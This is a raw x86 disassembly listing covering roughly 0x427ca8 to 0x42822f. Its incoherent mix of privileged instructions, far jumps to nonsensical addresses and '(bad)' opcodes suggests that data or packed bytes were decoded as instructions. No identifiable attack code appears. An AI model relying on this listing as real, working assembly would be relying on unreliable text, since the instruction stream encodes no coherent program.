  427ca8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  427caa:	ins    DWORD PTR es:[edi],dx
  427cab:	ficom  DWORD PTR [esi+0x26052dce]
  427cb1:	jle    0x427c75
  427cb3:	pop    es
  427cb4:	call   0x0:0x836e1dd1
  427cbb:	add    BYTE PTR [eax+0x3fc326ab],dl
  427cc1:	iret   
  427cc2:	cmc    
  427cc3:	sti    
  427cc4:	pushf  
  427cc5:	ds loop 0x427cb4
  427cc8:	retf   
  427cc9:	pop    ebp
  427cca:	cmp    BYTE PTR ds:0x1f41a,bh
  427cd0:	test   DWORD PTR [edx],eax
  427cd2:	add    BYTE PTR [eax],al
  427cd4:	int3   
  427cd5:	mov    esp,0xa196abe3
  427cda:	xor    eax,0x6573901a
  427cdf:	inc    ecx
  427ce0:	fiadd  DWORD PTR [edx+ebx*8]
  427ce3:	and    cl,BYTE PTR [eax]
  427ce5:	jl     0x427d08
  427ce7:	imul   edx,DWORD PTR [edx+ebp*1],0x5bda42ef
  427cee:	outs   dx,DWORD PTR ds:[esi]
  427cef:	or     DWORD PTR [esi+0x5b27cd76],edx
  427cf5:	fcom   DWORD PTR [ecx-0x50]
  427cf8:	fcmovnb st,st(4)
  427cfa:	xor    edx,DWORD PTR [eax+0x42]
  427cfd:	push   esi
  427cfe:	dec    ebp
  427cff:	cmp    BYTE PTR [edx+esi*2+0x5065385a],dh
  427d06:	fnstenv [esi]
  427d08:	ja     0x427d27
  427d0a:	xchg   ebp,eax
  427d0b:	cmc    
  427d0c:	xchg   esp,eax
  427d0d:	cmp    eax,0x4a9dab1
  427d12:	arpl   WORD PTR [esi+eax*4],cx
  427d15:	xchg   DWORD PTR [edi],ecx
  427d17:	stos   BYTE PTR es:[edi],al
  427d18:	pop    esi
  427d19:	adc    dh,BYTE PTR [ebx]
  427d1b:	sub    al,0xff
  427d1d:	dec    ecx
  427d1e:	jmp    0xc7e915da
  427d23:	das    
  427d24:	les    ebx,FWORD PTR [ebp+0x1]
  427d27:	mov    fs,edi
  427d29:	jnp    0x427cf8
  427d2b:	sub    eax,DWORD PTR [eax+ebx*8-0x13815dd1]
  427d32:	mov    edx,0xa62bfac2
  427d37:	push   0x27175e78
  427d3c:	cmp    al,0x19
  427d3e:	es loopne 0x427d16
  427d41:	dec    esp
  427d42:	inc    ecx
  427d43:	std    
  427d44:	xchg   DWORD PTR [esp+edi*8-0x7e],edx
  427d48:	pop    ds
  427d49:	test   DWORD PTR [eax+0x43],ebp
  427d4c:	imul   ecx,DWORD PTR [ecx+0x6eed7473],0x4820c0ac
  427d56:	test   BYTE PTR [ebx-0x3d],bh
  427d59:	jb     0x427dd7
  427d5b:	hlt    
  427d5c:	imul   ebx,DWORD PTR [esi+0x1231eafc],0xffffffde
  427d63:	mov    ebx,0xb77a695b
  427d68:	or     eax,0x8d1cf917
  427d6d:	sub    eax,0x41fd6ba
  427d72:	push   ebp
  427d73:	(bad)  
  427d74:	sbb    eax,0xea863c0d
  427d79:	test   eax,0x69037717
  427d7e:	mov    ah,0x68
  427d80:	xchg   ecx,eax
  427d81:	mov    bl,0x67
  427d83:	loop   0x427da4
  427d85:	stos   DWORD PTR es:[edi],eax
  427d86:	stos   BYTE PTR es:[edi],al
  427d87:	mov    BYTE PTR cs:0xb69bafb4,bh
  427d8e:	fcomip st,st(3)
  427d90:	aaa    
  427d91:	retf   0x2190
  427d94:	inc    eax
  427d95:	xchg   ebx,eax
  427d96:	xchg   edi,eax
  427d97:	inc    eax
  427d98:	cli    
  427d99:	out    dx,al
  427d9a:	ins    DWORD PTR es:[edi],dx
  427d9b:	dec    edi
  427d9c:	xor    al,0x11
  427d9e:	imul   ecx,DWORD PTR [ebx],0x5f03d892
  427da4:	fmul   st,st(2)
  427da6:	daa    
  427da7:	test   eax,0x13f0036b
  427dac:	add    ebx,DWORD PTR [edi+edi*4+0x71]
  427db0:	cmc    
  427db1:	mov    eax,fs
  427db3:	cmp    DWORD PTR [edi-0x6d],edx
  427db6:	push   es
  427db7:	lds    edx,FWORD PTR ds:0x15e21ba9
  427dbd:	cmp    eax,ebp
  427dbf:	stos   DWORD PTR es:[edi],eax
  427dc0:	retf   
  427dc1:	ds js  0x427e2a
  427dc4:	sti    
  427dc5:	and    BYTE PTR [edi-0x370caec0],0xa
  427dcc:	inc    esi
  427dcd:	repz rcr DWORD PTR ds:0x257e1a6a,cl
  427dd4:	pop    ecx
  427dd5:	adc    al,0x21
  427dd7:	fdiv   QWORD PTR [ebx+0x7d]
  427dda:	iret   
  427ddb:	mov    ds:0x713583cc,al
  427de0:	mov    edx,0x72b442f2
  427de5:	in     eax,0x5b
  427de7:	mov    esp,0x371333ff
  427dec:	or     eax,0x7cbef8a9
  427df1:	dec    eax
  427df2:	addr16 fadd st(4),st
  427df5:	ror    esi,0xf5
  427df8:	outs   dx,BYTE PTR ds:[esi]
  427df9:	out    dx,al
  427dfa:	dec    ebx
  427dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427dfc:	jmp    0x9878d228
  427e01:	into   
  427e02:	je     0x427dcc
  427e04:	xchg   ebp,eax
  427e05:	mov    al,ds:0x77ef614a
  427e0a:	add    edx,eax
  427e0c:	mov    eax,ds:0x62a7d58
  427e11:	xchg   DWORD PTR [esi-0x14a1f7fb],edi
  427e17:	aam    0xce
  427e19:	jo     0x427dda
  427e1b:	jnp    0x427e79
  427e1d:	pop    es
  427e1e:	cmp    ecx,edi
  427e20:	dec    ebx
  427e21:	inc    esp
  427e22:	adc    DWORD PTR [ecx+0x1d],ebp
  427e25:	test   al,0xfc
  427e27:	push   ebx
  427e28:	popf   
  427e29:	xchg   esi,eax
  427e2a:	sti    
  427e2b:	adc    al,BYTE PTR [eax+0x28c0d6d2]
  427e31:	outs   dx,BYTE PTR ds:[esi]
  427e32:	inc    ebp
  427e33:	stc    
  427e34:	adc    edx,DWORD PTR [ebx]
  427e36:	xcrypt-cfb (bad)
  427e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e38:	es mov dl,0x27
  427e3b:	mov    dh,0xb5
  427e3d:	sahf   
  427e3e:	jmp    0xd1f6:0xcea797bd
  427e45:	cmp    BYTE PTR [esi-0x2c5492ef],0x36
  427e4c:	xchg   esi,eax
  427e4d:	cmp    eax,DWORD PTR [edi]
  427e4f:	mov    fs,WORD PTR [esi-0x1f27065b]
  427e55:	sub    edi,edx
  427e57:	lods   al,BYTE PTR ds:[esi]
  427e58:	inc    ebp
  427e59:	mov    DWORD PTR [esi+0x2],ebp
  427e5c:	ror    DWORD PTR [edx+ebx*4-0x48a4dbdc],0xba
  427e64:	jno    0x427e0e
  427e66:	dec    esi
  427e67:	pop    esi
  427e68:	mov    ebx,0x63eb7e37
  427e6d:	cmp    BYTE PTR [edx+edi*4+0x6e],dl
  427e71:	loopne 0x427e6d
  427e73:	adc    DWORD PTR [eax+0x3b869e4d],ebx
  427e79:	add    ebp,DWORD PTR [edi]
  427e7b:	in     al,dx
  427e7c:	ja     0x427e19
  427e7e:	sbb    eax,0x1d510b61
  427e83:	push   0xffffffb4
  427e85:	mov    ss,WORD PTR [eax]
  427e87:	ss daa 
  427e89:	sub    DWORD PTR [ebx],0xb66a351a
  427e8f:	leave  
  427e90:	jle    0x427ecb
  427e92:	pusha  
  427e93:	dec    esi
  427e94:	xor    BYTE PTR [esi],ch
  427e96:	xchg   BYTE PTR [ebx+0x11],bl
  427e99:	jp     0x427ef9
  427e9b:	push   ds
  427e9c:	loop   0x427ebd
  427e9e:	js     0x427ecc
  427ea0:	jbe    0x427e25
  427ea2:	stos   DWORD PTR es:[edi],eax
  427ea3:	push   ebp
  427ea4:	inc    ebx
  427ea5:	cmp    dl,cl
  427ea7:	stc    
  427ea8:	pop    ecx
  427ea9:	clc    
  427eaa:	mov    DWORD PTR [edx+0x654380b5],eax
  427eb0:	cmp    ebp,edx
  427eb2:	and    DWORD PTR [esi-0x47],ebp
  427eb5:	in     eax,dx
  427eb6:	mov    dl,0x46
  427eb8:	pop    edx
  427eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427eba:	in     al,dx
  427ebb:	xor    WORD PTR [edx+0x8efcbab],bx
  427ec2:	shl    ch,1
  427ec4:	sub    al,0x2f
  427ec6:	lds    eax,FWORD PTR [esi+ebp*1]
  427ec9:	xor    al,0x65
  427ecb:	push   esp
  427ecc:	cmovno ecx,DWORD PTR [ebp+0x6e919d02]
  427ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ed4:	or     DWORD PTR [eax+0x6],ebx
  427ed7:	jbe    0x427f14
  427ed9:	add    eax,0x382af218
  427ede:	addr16 dec ebp
  427ee0:	fmul   QWORD PTR [ebp+0x72]
  427ee3:	mov    esi,0x7d4d15ca
  427ee8:	mov    al,ds:0xc0c309b
  427eed:	and    eax,0x6b7fb9b9
  427ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ef3:	iret   
  427ef4:	dec    esi
  427ef5:	adc    cx,WORD PTR [esi]
  427ef8:	xor    al,BYTE PTR [eax-0x47521740]
  427efe:	fptan  
  427f00:	xor    eax,0x7482535f
  427f05:	popa   
  427f06:	cmp    al,0x9d
  427f08:	imul   edx,DWORD PTR [edi+0x15],0x77937b7e
  427f0f:	pop    ss
  427f10:	cwde   
  427f11:	jge    0x427ee1
  427f13:	pop    ds
  427f14:	mov    esp,0xb506ac3
  427f19:	sbb    eax,0x332d1d20
  427f1e:	std    
  427f1f:	loop   0x427eda
  427f21:	es or  eax,0x5310cf05
  427f27:	push   ss
  427f28:	mov    bl,BYTE PTR [edx-0x2470a6df]
  427f2e:	pusha  
  427f2f:	sbb    ebx,DWORD PTR [esi-0x40]
  427f32:	sub    esi,DWORD PTR [eax+0x4a9acce0]
  427f38:	sbb    ebp,DWORD PTR [eax]
  427f3a:	iret   
  427f3b:	jae    0x427ecf
  427f3d:	test   BYTE PTR [edx],bh
  427f3f:	fmulp  st(7),st
  427f41:	mov    ecx,0xcb360f1b
  427f46:	dec    esi
  427f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f48:	int3   
  427f49:	push   0x8c1f0530
  427f4e:	mov    esi,0x2cdb43db
  427f53:	gs adc eax,0xbaf331
  427f5a:	add    BYTE PTR [eax],al
  427f5c:	std    
  427f5d:	cmp    DWORD PTR ds:0xfd1cf514,esi
  427f63:	stc    
  427f64:	int    0xea
  427f66:	xor    al,al
  427f68:	add    al,0xad
  427f6a:	rcr    ch,0x9f
  427f6d:	test   BYTE PTR [ecx],0x0
  427f70:	test   DWORD PTR [edx],eax
  427f72:	add    BYTE PTR [eax],al
  427f74:	jl     0x427f25
  427f76:	jmp    0x4133:0x9a4b9aca
  427f7d:	pop    ecx
  427f7e:	mov    al,ds:0xf821073
  427f83:	stos   BYTE PTR es:[edi],al
  427f84:	into   
  427f85:	sbb    dl,BYTE PTR gs:[ebp+0x48]
  427f89:	add    ecx,DWORD PTR [ebx-0x42]
  427f8c:	mov    eax,0x57776cd8
  427f91:	pop    es
  427f92:	mov    ds:0x143655f2,eax
  427f97:	das    
  427f98:	fmul   DWORD PTR [ebp+eiz*1-0x5513c51]
  427f9f:	or     ebp,ebp
  427fa1:	test   DWORD PTR [edi+0x2a8bb0bc],eax
  427fa7:	push   es
  427fa8:	(bad)  
  427fa9:	test   al,0xf6
  427fab:	mov    es,WORD PTR [ebx+0xde9980f]
  427fb1:	das    
  427fb2:	neg    BYTE PTR [esi+0x5344a5d1]
  427fb8:	ret    0xf4f1
  427fbb:	pop    eax
  427fbc:	sbb    eax,0x569642df
  427fc1:	out    dx,al
  427fc2:	jbe    0x428007
  427fc4:	ror    BYTE PTR [edx+0x3],0x37
  427fc8:	lods   eax,DWORD PTR ds:[esi]
  427fc9:	cmp    al,0x90
  427fcb:	jle    0x427fe4
  427fcd:	xchg   ebx,eax
  427fce:	jnp    0x427f55
  427fd0:	imul   eax,DWORD PTR [eax+0x46],0xb0eb909
  427fd7:	push   edi
  427fd8:	mov    WORD PTR [ecx],cs
  427fda:	mov    bl,0xa1
  427fdc:	and    DWORD PTR [ecx-0x15429c2e],ecx
  427fe2:	fcomp  QWORD PTR [esi+0x30c31188]
  427fe8:	push   bp
  427fea:	or     ecx,0x7e
  427fed:	dec    ecx
  427fee:	inc    ebx
  427fef:	test   al,0x28
  427ff1:	pop    ss
  427ff2:	push   es
  427ff3:	mov    dh,0x9c
  427ff5:	iret   
  427ff6:	mov    gs,WORD PTR [edx-0x64]
  427ff9:	aad    0x8b
  427ffb:	icebp  
  427ffc:	cmp    eax,DWORD PTR [ecx-0x23]
  427fff:	mov    ah,0xca
  428001:	mov    ds:0x4d4ea11b,al
  428006:	xchg   ebx,eax
  428007:	sbb    ch,BYTE PTR [edx-0x72]
  42800a:	cld    
  42800b:	sub    esi,esi
  42800d:	or     dl,BYTE PTR [esi]
  42800f:	mov    bh,BYTE PTR [ebx+0x3a4a274f]
  428015:	sbb    eax,0xe1e09a72
  42801a:	repz mov ah,0x1d
  42801d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42801e:	pop    esi
  42801f:	(bad)  
  428020:	jnp    0x427fbf
  428022:	js     0x428029
  428024:	mov    ch,BYTE PTR [ebp-0x4c]
  428027:	mov    edi,0xe55bc85e
  42802c:	cli    
  42802d:	call   0xf3b3cf97
  428032:	cwde   
  428033:	sbb    esp,0xfffffffe
  428036:	jb     0x4280ab
  428038:	je     0x427fe0
  42803a:	in     al,dx
  42803b:	retf   
  42803c:	jmp    0x427fc6
  42803e:	jecxz  0x427ffd
  428040:	lods   al,BYTE PTR ds:[esi]
  428041:	inc    ecx
  428042:	fist   WORD PTR ds:0xd53945de
  428048:	call   0x92cb8ed0
  42804d:	xlat   BYTE PTR ds:[ebx]
  42804e:	add    DWORD PTR [ecx-0x4f],ebp
  428051:	jne    0x42808b
  428053:	push   ss
  428054:	push   0x560dd0b3
  428059:	sub    BYTE PTR [edx-0xd],al
  42805c:	xor    al,0xfc
  42805e:	mov    esp,0x50e46177
  428063:	(bad)  
  428064:	sub    edi,ebx
  428066:	add    dh,BYTE PTR [eax]
  428068:	inc    ebp
  428069:	call   0x1156:0x4e0286f6
  428070:	xor    al,0x19
  428072:	ins    BYTE PTR es:[edi],dx
  428073:	mov    DWORD PTR ds:[edi+0x74],ebx
  428077:	imul   edx,DWORD PTR [edx],0xaff09053
  42807d:	bound  edi,QWORD PTR [esi]
  42807f:	cmp    ebp,edx
  428081:	sbb    al,0xfa
  428083:	lea    edx,cs:[eax+0xf78560]
  42808a:	dec    eax
  42808b:	icebp  
  42808c:	jno    0x4280d3
  42808e:	add    cl,BYTE PTR [edi+edi*2-0x5ae87305]
  428095:	sub    ebx,esi
  428097:	dec    edx
  428098:	ret    0x32c
  42809b:	cmp    esi,esi
  42809d:	fisubr WORD PTR [ebx]
  42809f:	adc    ax,WORD PTR [ecx]
  4280a2:	sahf   
  4280a3:	add    bh,BYTE PTR [edx-0x80]
  4280a6:	ja     0x4280da
  4280a8:	sub    edi,DWORD PTR [esp+eiz*4]
  4280ab:	in     eax,dx
  4280ac:	jne    0x42810a
  4280ae:	pop    es
  4280af:	mov    cl,0x77
  4280b1:	imul   eax,ecx,0x80441658
  4280b7:	xchg   ecx,eax
  4280b8:	xchg   edx,eax
  4280b9:	fdivr  st,st(3)
  4280bb:	or     al,0x95
  4280bd:	jnp    0x428126
  4280bf:	pushf  
  4280c0:	mov    esi,0xd0a0cdfb
  4280c5:	mov    edx,0xdebbe8c4
  4280ca:	push   ds
  4280cb:	in     eax,dx
  4280cc:	xlat   BYTE PTR ds:[ebx]
  4280cd:	push   cs
  4280ce:	rcl    BYTE PTR [edx-0x76],cl
  4280d1:	ret    
  4280d2:	lock sub ah,BYTE PTR ss:[esi]
  4280d6:	ret    
  4280d7:	pushf  
  4280d8:	jnp    0x428093
  4280da:	loop   0x4280b6
  4280dc:	adc    ebx,ecx
  4280de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280df:	bound  esp,QWORD PTR [ecx]
  4280e1:	fisub  WORD PTR [eax]
  4280e3:	ins    DWORD PTR es:[edi],dx
  4280e4:	iret   
  4280e5:	rcl    DWORD PTR [ebp+0x549be78e],0x43
  4280ec:	jmp    0x428120
  4280ee:	or     dl,0x80
  4280f1:	das    
  4280f2:	out    0x89,eax
  4280f4:	stos   BYTE PTR es:[edi],al
  4280f5:	add    eax,0x7a9718da
  4280fa:	or     edi,edx
  4280fc:	add    ebx,esp
  4280fe:	cmp    ebx,DWORD PTR [ecx-0x6]
  428101:	cs push 0x76eb005e
  428107:	pop    ds
  428108:	cmp    BYTE PTR [ebx],dh
  42810a:	mov    ah,0x1b
  42810d:	jg     0x428169
  42810f:	mov    esp,0xeff44763
  428114:	pop    esi
  428115:	loop   0x4280ba
  428117:	ds jle 0x42815c
  42811a:	das    
  42811b:	xchg   ebx,eax
  42811c:	loope  0x428198
  42811e:	mov    ch,0x87
  428120:	retf   
  428121:	and    edx,DWORD PTR [ecx-0x17]
  428124:	inc    edi
  428125:	mov    ds:0x6d7f58f3,al
  42812a:	repz mov edi,ebp
  42812d:	neg    edx
  42812f:	mov    cl,0x13
  428131:	(bad)  
  428132:	fsub   QWORD PTR [edx+edx*8]
  428135:	mov    WORD PTR [edx-0x3db6de69],?
  42813b:	clc    
  42813c:	or     DWORD PTR [eax+0x22],0x70
  428140:	mov    BYTE PTR [eax+0x28],bh
  428143:	punpckldq mm3,DWORD PTR [eax-0x2ff483de]
  42814a:	cmp    al,BYTE PTR [esi+eax*1-0x78]
  42814e:	fist   DWORD PTR ds:0x218d9285
  428154:	fwait
  428155:	xor    BYTE PTR ds:0xea21c803,ah
  42815b:	adc    edi,DWORD PTR [eax-0x55]
  42815e:	pop    ebp
  42815f:	and    BYTE PTR [ebx+0x76e9199f],bh
  428165:	nop
  428166:	mov    edx,edx
  428168:	add    BYTE PTR [ebp+0x67],0x66
  42816c:	or     ah,BYTE PTR [ebp-0xf]
  42816f:	mov    eax,ds:0xa96f3fa0
  428174:	cmc    
  428175:	xchg   ebp,eax
  428176:	out    0x91,al
  428178:	pop    ss
  428179:	ror    DWORD PTR [ebp-0x5ba11689],1
  42817f:	out    0x4c,eax
  428181:	pop    edx
  428182:	xchg   edi,eax
  428183:	pop    edi
  428184:	sar    DWORD PTR [edx-0x2e6f534d],cl
  42818a:	cmp    al,ch
  42818c:	loop   0x4281f6
  42818e:	pop    ebx
  42818f:	xor    dh,BYTE PTR [edi+0x3a5b2599]
  428195:	adc    BYTE PTR [edx+eiz*2-0x3a1ea2b2],dh
  42819c:	scas   al,BYTE PTR es:[edi]
  42819d:	outs   dx,DWORD PTR ds:[esi]
  42819e:	neg    BYTE PTR [edx]
  4281a0:	adc    BYTE PTR [esi],ah
  4281a2:	mov    DWORD PTR [eax+0x4f],ecx
  4281a5:	in     eax,dx
  4281a6:	jbe    0x4281ae
  4281a8:	mov    al,ds:0xb1b46ac
  4281ad:	mov    edi,0xf5b60837
  4281b2:	xchg   ecx,eax
  4281b3:	repz xor edi,eax
  4281b6:	add    al,dh
  4281b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281b9:	shr    DWORD PTR [eax-0xc37aeff],0x63
  4281c0:	retf   
  4281c1:	add    ch,ch
  4281c3:	mov    al,ss:0xbb2fae50
  4281c9:	out    0xd4,al
  4281cb:	or     ch,BYTE PTR [edi-0x52]
  4281ce:	dec    edi
  4281cf:	xor    al,0x18
  4281d1:	in     eax,dx
  4281d2:	out    dx,eax
  4281d3:	sti    
  4281d4:	enter  0x8349,0x2
  4281d8:	lods   al,BYTE PTR ds:[esi]
  4281d9:	or     BYTE PTR [esi],bh
  4281db:	fcmovb st,st(6)
  4281dd:	or     eax,0x80231b9f
  4281e2:	(bad)  
  4281e3:	cmp    esi,esi
  4281e5:	sub    al,0x7b
  4281e7:	sbb    bl,cl
  4281e9:	fwait
  4281ea:	pop    ebp
  4281eb:	out    0xa,eax
  4281ed:	and    ebx,ebp
  4281ef:	inc    edx
  4281f0:	cld    
  4281f1:	(bad)  
  4281f2:	rcr    DWORD PTR [edi-0x1f],0x15
  4281f6:	push   cs
  4281f7:	aas    
  4281f8:	les    eax,FWORD PTR [eax]
  4281fa:	add    BYTE PTR [eax],al
  4281fc:	test   eax,0xf82c6051
  428201:	cmp    eax,0x8ba9d5ed
  428206:	mov    ebx,0x95387c92
  42820b:	mov    al,ds:0x1f924
  428210:	sbb    eax,0x83000000
  428215:	push   ss
  428216:	cmp    esp,DWORD PTR [ebp-0x66]
  428219:	imul   eax,DWORD PTR [edx+0x13aff296],0xc502794e
  428223:	xor    DWORD PTR [esp+esi*1-0x5f283fc0],0x1bbfd2
  42822e:	scas   al,BYTE PTR es:[edi]
  42822f:	and    BYTE PTR [ecx],al
	...
